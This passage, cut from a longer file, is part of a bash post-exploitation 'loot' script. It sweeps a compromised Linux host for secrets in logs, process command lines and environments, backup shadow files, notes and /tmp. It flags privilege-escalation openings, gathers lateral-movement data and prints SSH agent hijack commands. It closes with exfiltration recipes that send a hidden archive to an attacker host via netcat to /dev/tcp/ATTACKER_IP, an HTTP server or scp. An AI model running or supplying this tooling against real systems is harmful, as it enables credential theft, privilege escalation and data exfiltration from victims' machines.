        [[ -s "$LOGS/$(basename "$logdir")/possible_creds_in_logs.txt" ]] && \
            hit "Possible credentials found in $logdir access logs!"

        # IP pattern analysis
        grep -oE '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+' "$logdir"/*.log 2>/dev/null | \
            sort | uniq -c | sort -rn | head -30 \
            > "$LOGS/$(basename "$logdir")/top_ips.txt"
    fi
done

# Mail logs
for lf in /var/log/mail.log /var/log/maillog; do
    safe_copy "$lf" "$LOGS/$(basename "$lf")"
done

# Application logs containing credentials
log_info "Searching app logs for credentials..."
find /opt /var/www /srv -name "*.log" -readable -size -10M 2>/dev/null | \
    while read -r lf; do
        HITS=$(grep -iE "(password|secret|api.?key|token)[\s=:]+\S+" "$lf" 2>/dev/null | head -20)
        if [[ -n "$HITS" ]]; then
            echo "$HITS" > "$LOGS/app_log_creds_$(basename "$lf")"
            hit "Credentials in log: $lf"
        fi
    done

# =============================================================================
# SECTION 12: PRIVILEGE ESCALATION ARTIFACTS
# =============================================================================
log_sec "Privilege Escalation Artifacts"
PRIV="$LOOT_DIR/privesc"
mkdir -p "$PRIV"

{
    echo "=== SUID Binaries ==="
    find / -perm -4000 -type f 2>/dev/null

    echo ""
    echo "=== SGID Binaries ==="
    find / -perm -2000 -type f 2>/dev/null

    echo ""
    echo "=== Capabilities ==="
    getcap -r / 2>/dev/null

    echo ""
    echo "=== World-Writable Directories ==="
    find / -writable -type d -not -path "*/proc/*" -not -path "*/sys/*" 2>/dev/null | head -50

    echo ""
    echo "=== Writable Service Files ==="
    find /etc/systemd /lib/systemd /usr/lib/systemd \
        -writable -type f 2>/dev/null

    echo ""
    echo "=== Writable Cron Jobs ==="
    find /etc/cron* /var/spool/cron -writable -type f 2>/dev/null

    echo ""
    echo "=== Writable PATH Directories ==="
    echo "$PATH" | tr ':' '\n' | while read -r dir; do
        [[ -w "$dir" ]] && echo "WRITABLE: $dir"
    done

    echo ""
    echo "=== NFS No-Root-Squash ==="
    grep -i "no_root_squash" /etc/exports 2>/dev/null

} > "$PRIV/privesc_info.txt" 2>&1

# Systemd unit files
systemctl list-unit-files 2>/dev/null > "$PRIV/systemctl_list_unit_files.txt"
safe_copy_dir "/etc/systemd" "$PRIV/systemd_etc"

# Writable systemd units
WRITABLE_UNITS=$(find /etc/systemd /lib/systemd /usr/lib/systemd \
    -writable -name "*.service" 2>/dev/null)
if [[ -n "$WRITABLE_UNITS" ]]; then
    echo "$WRITABLE_UNITS" > "$PRIV/writable_systemd_units.txt"
    hit "Writable systemd unit files found! (privesc/writable_systemd_units.txt)"
fi

# High-value group checks
id | grep -q "docker"         && hit "User is in docker group — trivial root escalation!"
id | grep -q "lxd\|lxc"      && hit "User is in lxd/lxc group — trivial root escalation!"
id | grep -q "\bdisk\b"       && hit "User is in disk group — can read raw disk!"
id | grep -q "\badm\b"        && hit "User is in adm group — can read logs!"
id | grep -q "\bsudoers\b"    && hit "User is in sudoers group!"

# Writable critical files
[[ -w "/etc/passwd" ]]   && hit "/etc/passwd is writable — trivial root!"
[[ -w "/etc/sudoers" ]]  && hit "/etc/sudoers is writable — trivial root!"
[[ -w "/etc/shadow" ]]   && hit "/etc/shadow is writable — overwrite root hash!"

# NFS no_root_squash
grep -q "no_root_squash" /etc/exports 2>/dev/null && \
    hit "NFS no_root_squash detected in /etc/exports — mount from attacker as root!"

# Writable cron files
find /etc/cron* /var/spool/cron -writable -type f 2>/dev/null | \
    while read -r cf; do hit "Writable cron file: $cf"; done

# =============================================================================
# SECTION 13: NETWORK & LATERAL MOVEMENT DATA
# =============================================================================
log_sec "Network & Lateral Movement"
NET="$LOOT_DIR/network"
mkdir -p "$NET"

{
    echo "=== ARP Cache ===" && (arp -a 2>/dev/null || ip n 2>/dev/null)
    echo "=== /proc/net/arp ===" && cat /proc/net/arp 2>/dev/null
    echo "=== /etc/hosts ===" && cat /etc/hosts
    echo "=== DNS Config ===" && cat /etc/resolv.conf
    echo "=== Routing Table ===" && (ip r 2>/dev/null || route -n 2>/dev/null)
    echo "=== Listening Services ===" && (ss -tlnup 2>/dev/null || netstat -tlnup 2>/dev/null)
    echo "=== All Connections ===" && (ss -anp 2>/dev/null || netstat -anp 2>/dev/null)
    echo "=== SSH Known Hosts (system) ===" && cat /etc/ssh/ssh_known_hosts 2>/dev/null
    echo "=== NFS Shares ===" && showmount -e 2>/dev/null
    echo "=== NFS Mounts (fstab) ===" && grep -i nfs /etc/fstab 2>/dev/null
    echo "=== Proxy Env Vars ===" && env | grep -i proxy
} > "$NET/network_info.txt" 2>&1

# All users' known_hosts (pivot targets)
find /root /home -name "known_hosts" -readable 2>/dev/null | \
    while read -r kh; do
        user=$(echo "$kh" | awk -F'/' '{print $3}')
        safe_copy "$kh" "$NET/known_hosts_${user}"
        log_ok "known_hosts saved for $user"
    done

# System-wide crontabs
safe_copy "/etc/crontab" "$NET/etc_crontab"
safe_copy_dir "/etc/cron.d" "$NET/cron.d"
for dir in /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly; do
    safe_copy_dir "$dir" "$NET/$(basename "$dir")"
done
# User crontabs from spool
find /var/spool/cron /var/spool/cron/crontabs -type f -readable 2>/dev/null | \
    while read -r uc; do
        safe_copy "$uc" "$NET/user_crontabs/$(basename "$uc")"
    done

# =============================================================================
# SECTION 14: MEMORY & PROCESS SECRETS
# =============================================================================
log_sec "Process & Memory Secrets"
MEM="$LOOT_DIR/memory"
mkdir -p "$MEM"

# Process cmdlines (passwords passed as args are visible here)
log_info "Dumping process command lines for secrets..."
{
    for pid in /proc/[0-9]*/cmdline; do
        pnum=$(echo "$pid" | cut -d/ -f3)
        comm=$(cat "/proc/$pnum/comm" 2>/dev/null)
        line=$(cat "$pid" 2>/dev/null | tr '\0' ' ')
        if echo "$line" | grep -qiE "pass|secret|token|key|api|cred"; then
            echo "PID $pnum ($comm): $line"
        fi
    done
} > "$MEM/process_cmdline_secrets.txt" 2>&1
[[ -s "$MEM/process_cmdline_secrets.txt" ]] && \
    hit "Secrets found in process command lines!"

# Process environments
log_info "Dumping readable process environments..."
{
    for pid in /proc/[0-9]*/environ; do
        if [[ -r "$pid" ]]; then
            pnum=$(echo "$pid" | cut -d/ -f3)
            comm=$(cat "/proc/$pnum/comm" 2>/dev/null)
            content=$(cat "$pid" 2>/dev/null | tr '\0' '\n' | \
                grep -iE "pass|secret|token|key|api|cred|db_|database" 2>/dev/null)
            if [[ -n "$content" ]]; then
                echo "=== PID $pnum ($comm) ==="
                echo "$content"
                echo ""
            fi
        fi
    done
} > "$MEM/process_env_secrets.txt" 2>&1
[[ -s "$MEM/process_env_secrets.txt" ]] && \
    hit "Secrets found in process environments!"

# SSH hijack info
{
    echo "=== Active SSH Sessions ==="
    ps aux | grep -i "sshd:" | grep -v grep
    echo ""
    echo "=== SSH Agent Sockets ==="
    find /tmp /run -name "agent.*" 2>/dev/null
    echo ""
    echo "=== Hijack commands ==="
    echo "SSH_AUTH_SOCK=/path/to/socket ssh-add -l"
    echo "SSH_AUTH_SOCK=/path/to/socket ssh user@target"
} > "$MEM/ssh_hijack_info.txt" 2>&1

# =============================================================================
# SECTION 15: MISCELLANEOUS HIGH-VALUE FILES
# =============================================================================
log_sec "Miscellaneous High-Value Files"
MISC="$LOOT_DIR/misc"
mkdir -p "$MISC"

# Backup password files
for f in /etc/passwd- /etc/shadow- /etc/passwd.bak \
         /etc/shadow.bak /etc/passwd.orig /etc/shadow.orig; do
    safe_copy "$f" "$MISC/$(basename "$f")" && hit "Backup password file: $f"
done

# Notes/docs with possible secrets
find /home /root /opt /srv /var/www \
    -type f \( -name "*.txt" -o -name "*.md" -o -name "notes*" \
    -o -name "creds*" -o -name "credentials*" -o -name "passwords*" \
    -o -name "pass*" -o -name "secret*" -o -name "todo*" \) \
    -readable 2>/dev/null | while read -r f; do
        safe_copy "$f" "$MISC/notes/$(echo "$f" | tr '/' '_')"
        hit "Possible notes/creds file: $f"
    done

# /tmp — leftover credentials or scripts
ls -lah /tmp 2>/dev/null > "$MISC/tmp_listing.txt"
find /tmp -type f -readable 2>/dev/null | \
    while read -r f; do
        grep -qiE "pass|secret|token|key|cred" "$f" 2>/dev/null && \
            safe_copy "$f" "$MISC/tmp_interesting/$(basename "$f")" && \
            hit "Interesting /tmp file: $f"
    done

# Mail spools
for maildir in /var/mail /var/spool/mail; do
    [[ -d "$maildir" && -r "$maildir" ]] && safe_copy_dir "$maildir" "$MISC/mail"
done

# =============================================================================
# SECTION 16: SOFTWARE VERSIONS (CVE matching)
# =============================================================================
log_sec "Software Versions (CVE matching)"
VERS="$LOOT_DIR/versions"
mkdir -p "$VERS"

{
    echo "=== Kernel ===" && uname -r
    echo "=== sudo ===" && sudo --version 2>/dev/null
    echo "=== Python ===" && python3 --version 2>/dev/null; python --version 2>/dev/null
    echo "=== Perl ===" && perl --version 2>/dev/null | head -3
    echo "=== Ruby ===" && ruby --version 2>/dev/null
    echo "=== PHP ===" && php --version 2>/dev/null | head -2
    echo "=== Node ===" && node --version 2>/dev/null
    echo "=== gcc ===" && gcc --version 2>/dev/null | head -1
    echo "=== Docker ===" && docker --version 2>/dev/null
    echo "=== mysql ===" && mysql --version 2>/dev/null
    echo "=== psql ===" && psql --version 2>/dev/null
    echo "=== redis-server ===" && redis-server --version 2>/dev/null
    echo "=== curl ===" && curl --version 2>/dev/null | head -1
    echo "=== wget ===" && wget --version 2>/dev/null | head -1
    echo "=== openssl ===" && openssl version 2>/dev/null
    echo "=== git ===" && git --version 2>/dev/null
    echo "=== kubectl ===" && kubectl version --client 2>/dev/null
    echo "=== helm ===" && helm version 2>/dev/null
    echo "=== ansible ===" && ansible --version 2>/dev/null | head -1
    echo "=== terraform ===" && terraform version 2>/dev/null | head -1
    echo "=== All Packages ===" && (dpkg -l 2>/dev/null || rpm -qa 2>/dev/null)
} > "$VERS/versions.txt" 2>&1
log_ok "Software versions saved"

# =============================================================================
# WRAP UP & SUMMARY
# =============================================================================
echo ""
log_sec "Loot Complete"

LOOT_SIZE=$(du -sh "$LOOT_DIR" 2>/dev/null | cut -f1)
TOTAL_FILES=$(find "$LOOT_DIR" -type f 2>/dev/null | wc -l)
TOTAL_HITS=$(grep -c "." "$LOOT_DIR/HITS_SUMMARY.txt" 2>/dev/null || echo 0)

log_ok "Total loot size:  $LOOT_SIZE"
log_ok "Total files:      $TOTAL_FILES"
log_ok "Total hits:       $TOTAL_HITS"
log_ok "Loot directory:   $LOOT_DIR"
echo ""

# Print hits summary
echo -e "${MAG}╔══════════════════════════════════════════╗${NC}"
echo -e "${MAG}║           HITS SUMMARY                   ║${NC}"
echo -e "${MAG}╚══════════════════════════════════════════╝${NC}"
cat "$LOOT_DIR/HITS_SUMMARY.txt"
echo ""

echo -e "${YLW}=== Exfil Options ===${NC}"
echo -e "  ${BLU}Pack it:${NC}"
echo -e "  tar czf /tmp/.l.tar.gz $LOOT_DIR"
echo ""
echo -e "  ${BLU}Netcat:${NC}"
echo -e "  Attacker: nc -lvnp 4444 > loot.tar.gz"
echo -e "  Target:   cat /tmp/.l.tar.gz > /dev/tcp/ATTACKER_IP/4444"
echo ""
echo -e "  ${BLU}Python HTTP server:${NC}"
echo -e "  cd \$(dirname $LOOT_DIR) && python3 -m http.server 8080"
echo -e "  Attacker: wget http://TARGET_IP:8080/.l.tar.gz"
echo ""
echo -e "  ${BLU}SCP:${NC}"
echo -e "  scp /tmp/.l.tar.gz attacker@ATTACKER_IP:/tmp/"
echo ""
